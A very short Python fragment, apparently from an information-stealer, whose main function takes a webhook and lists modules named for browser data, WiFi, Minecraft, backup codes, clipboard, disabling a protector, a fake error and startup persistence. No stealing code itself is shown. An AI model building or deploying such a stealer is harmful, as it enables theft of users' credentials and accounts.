...
def main(webhook: str):
    threads = [Browsers, Wifi, Minecraft, BackupCodes, Clipboard, killprotector, fakeerror, startup]
    configcheck(threads)
